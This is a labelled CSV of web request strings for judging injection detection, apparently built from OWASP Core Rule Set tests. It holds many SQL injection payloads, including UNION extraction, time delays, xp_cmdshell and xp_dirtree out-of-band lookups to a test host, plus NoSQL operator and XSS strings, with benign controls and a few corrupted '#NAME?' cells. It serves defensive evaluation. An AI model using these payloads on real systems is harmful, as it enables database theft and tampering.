string,classification,Model
/?test=select+if(x,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=3' ' 1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"javascript:""/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html""",Safe,ChatGPT5.2 thinking
/?var=';,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var='glob 1;,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=';print',MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=';#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var='or(id glob 1)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var='or(glob 1)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var= exec xp_cmdshell,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"""!""",Safe,ChatGPT5.2 thinking
"""union+select",MaliciousIntended-but-safe,ChatGPT5.2 thinking
current_user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
FROM+INFORMATION_SCHEMA.,MaliciousIntended-but-safe,ChatGPT5.2 thinking
';SELECT+P,MaliciousIntended-but-safe,ChatGPT5.2 thinking
UnIon+seleCt,MaliciousIntended-but-safe,ChatGPT5.2 thinking
'union select/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"select]=polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,version(),user(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
select(user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"SeLect*/+1,2,3,user(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"select]=(ExtractValue(1,(select%20concat_ws(0x3a,user(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
from+`information_schema`,MaliciousIntended-but-safe,ChatGPT5.2 thinking
'select+H,MaliciousIntended-but-safe,ChatGPT5.2 thinking
#NAME?,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"""!+Y",Safe,ChatGPT5.2 thinking
exec+master.,MaliciousIntended-but-safe,ChatGPT5.2 thinking
into+outfile+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
selectect%20user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
#NAME?,MaliciousIntended-but-safe,ChatGPT5.2 thinking
selectect%2520user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"execution=e1s1&OlyH=9767+AND+1=1+UNION+ALL+SELECT+1,NULL,'<script>alert(""XSS"")</script>',table_name+FROM+information_schema.tables+WHERE+2>1--/**/;+EXEC+xp_cmdshell",MaliciousIntended-but-safe,ChatGPT5.2 thinking
'!`,Safe,ChatGPT5.2 thinking
""" UNION ALL SELECT",MaliciousIntended-but-safe,ChatGPT5.2 thinking
EXec+xp_cmdshell,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"select+1+FROM(select+count(*),concat((select+(select+concat(user(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
`!1,Safe,ChatGPT5.2 thinking
uNioN++sElecT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
""";SELECT+P",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=UnIoN+SeLeCt,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=1);declare@qvarchar(99);set@q='\\j0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule''set.org\kph';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=content.ini);declare@qvarchar(99);set@q='\\i1kvc9uwkehiqzrt4hcnovpublhunittests.corerule''set.org\lri';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=EmptyValue','4','2','7');declare@qvarchar(99);set@q='\\h5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\vcr';execmaster.dbo.xp_dirtree@q;--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=test));declare@qvarchar(99);set@q='\\zwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\gej';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"id=@.:=right(right((select+user_login+from+wordpress.wp_users+limit+1,1),1111),1111)+union#",MaliciousIntended-but-safe,ChatGPT5.2 thinking
distinctrow select@.,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"arg=Die ""Union von Europa""",Safe,ChatGPT5.2 thinking
"arg=SELECT IIF(1 > 1, 'TRUE', 'FALSE' )",Safe,ChatGPT5.2 thinking
"arg=it is my beliif (stemming from personal experience), that",Safe,ChatGPT5.2 thinking
"arg=appUser(sitename,user)",Safe,ChatGPT5.2 thinking
",varname""=somedata",Safe,ChatGPT5.2 thinking
var= @.= ( SELECT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=AND+2771=1709),MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=;+insert+into,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=AND+7639=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=or+120=121=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=AND+deleted+=+0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=/Cm7+OR+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=OR+(7319=8742),MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=||(null!=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=and+1!=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=div+role=""",Safe,ChatGPT5.2 thinking
"pay=div+id=""",Safe,ChatGPT5.2 thinking
"pay=div+style=""",Safe,ChatGPT5.2 thinking
pay=or+1=',MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=AND+7829=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=AND+4372=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=;+UpdateUserTypeTracking,Safe,ChatGPT5.2 thinking
pay=oR+pmw==,Safe,ChatGPT5.2 thinking
pay=||+langCode+==+',Safe,ChatGPT5.2 thinking
pay=||+c+==+',Safe,ChatGPT5.2 thinking
pay=||+arg+==+',Safe,ChatGPT5.2 thinking
pay=/Hmong_language+AND+,Safe,ChatGPT5.2 thinking
pay=||+langCode+==,Safe,ChatGPT5.2 thinking
pay=||+checker+==,Safe,ChatGPT5.2 thinking
pay=&&+setPath+!=,Safe,ChatGPT5.2 thinking
pay=;set+@,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=;update+users,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=and+1=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=/SPZwOaVcDWkrRly2aV01662fN+Or+,Safe,ChatGPT5.2 thinking
pay=OR+CType=',MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=1+OR+2+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=>SET+@OLD_SQL_NOTES,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=;SET+@OLD_SQL_MODE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=;SET+@OLD_FOREIGN_KEY_CHECKS,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=;SET+@OLD_UNIQUE_CHECKS,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=;drop,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=+SET+@OLD_SQL_NOTES,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=@example.com&name=(select,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=@extension]=MmcDirectmailSubscription&tx_mmcdirectmailsubscription_subscr[__referrer][@vendor]=(SELECT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=@extension]=MmcDirectmailSubscription&tx_mmcdirectmailsubscription_subscr[__referrer][@vendor]=MMC&tx_mmcdirectmailsubscription_subscr[__referrer][@controller]=Subscribe&tx_mmcdirectmailsubscription_subscr[__referrer][@action]=register&tx_mmcdirectmailsubscription_subscr[__referrer][arguments]=YTowOnt98f5f75937bad1b56b6c736ef42e625647dab347d&tx_mmcdirectmailsubscription_subscr[__referrer][@request]=a:4:{s:10:&tx_mmcdirectmailsubscription_subscr[__trustedProperties]=a:4:{s:7:&tx_mmcdirectmailsubscription_subscr[address][firstName]=(SELECT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=and+object_type+=+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=/Business+and,Safe,ChatGPT5.2 thinking
pay=AND+value+=+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=4AND4+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=/3+or+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=/3+and(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=/xxxx_R+AND+,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=/xxxx_R+or,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=1+GROUP+BY+CONCAT(0x716a787671,(SELECT+MID((IFNULL(CAST(a_1_18+AS+CHAR),0x20)),1,54)+FROM+db_justiz_daz.ugesundheit_antworten+ORDER+BY+id+LIMIT+571,1),0x7178716b71,FLOOR(RAND(0)*2))+HAVING+MIN(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=AND+backend_layout!=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=AND+uid!=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=and+1=1',MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=&&(l=!0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=||(e+=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=&&(e===,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=&&(null==(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=&&(a=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=||(c=!1),MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=&&(d!==,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=||(g=!0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=&&(e=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=&&(c=!0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=&&(f+=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=||(x=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=&&(b=0),MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=||(e===,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=||(c===,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=&&+1==(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=ORbackend_layout=',MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=--alter,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=AND(name=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=ORname=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=4oR2-,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=ANDengine=',MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=andcode!=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=andfreigabe=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=AND6698=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=orclass!=""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=or4975==4975',MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=1GROUPBYCONCAT(0x7162766a71,(SELECT(CASEWHEN(5554=5554)THEN1ELSE0END)),0x7171786271,FLOOR(RAND(0)*2))HAVINGMIN(",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?string_to_convert=4294967296,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?i=2.2250738585072011e-308,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=) like (,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=)like(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=I like you!,Safe,ChatGPT5.2 thinking
/?var= case when condition1 then result1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=having pain!,Safe,ChatGPT5.2 thinking
/?var=SELECT x GROUP BY SOMETHING HAVING COUNT(Id) >= 9,Safe,ChatGPT5.2 thinking
"/?var=SELECT * FROM `movies` GROUP BY `category_id`,`year_released` HAVING `category_id` = 8;",Safe,ChatGPT5.2 thinking
/?var=behaving badly/,Safe,ChatGPT5.2 thinking
/?var=o.havingu@gmail.com,Safe,ChatGPT5.2 thinking
/?var=if(2=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=Just in case (abc),Safe,ChatGPT5.2 thinking
/?var=if(1234=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+WAITFOR+DELAY+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
;waitfor+delay+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
;WAITFOR+DELAY+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
';+waitfor+delay+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
'+waitfor+delay+',MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay="";waitfor+delay+'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"pay=ALTER+TABLE+`mass_mails`+CHANGE+`receivers`+`receivers`+ENUM('FACILITIES','APPLICATION_2015','APPLICATION_2016')+CHARACTER+SET+utf8",Malicious-Unsafe,ChatGPT5.2 thinking
ALTER+TABLE+`tx_v3appointment_domain_model_appointment`+ADD+`video`+TEXT+CHARACTER+SET+latin1,Malicious-Unsafe,ChatGPT5.2 thinking
"/?var=EXECUTE IMMEDIATE """,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var= HAVING COUNT(CustomerID) > 5,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=having fun,Safe,ChatGPT5.2 thinking
/?var=something LIKE ',MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=union select col from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?test=Xunionselectfrom,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=select pg_sleep,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"var=""tester@coreruleset.org""'waitfordelay'0:0:20'--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/mongo/show.php?u_id[$ne]=2,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?mongoQ=[$lte]asdfsd,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/mongo/show.php?u_id[$regex]=2,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"{""$not"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"{""$nor"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"{""$where"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"{""$elemMatch"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
"{""$text"":""foo""}",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=)when234then&foo=bar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=booked for 2021(including 2020,Safe,ChatGPT5.2 thinking
"/?var=""' and = bar",MaliciousIntended-but-safe,ChatGPT5.2 thinking
/?var=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,MaliciousIntended-but-safe,ChatGPT5.2 thinking
"/?var=order by if(1=1,1,sleep(1))",MaliciousIntended-but-safe,ChatGPT5.2 thinking
var=procedure analyse (,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=exec+(@,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=declare+@b,MaliciousIntended-but-safe,ChatGPT5.2 thinking
pay=DECLARE/**/@x,MaliciousIntended-but-safe,ChatGPT5.2 thinking
/index.php?id=password::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
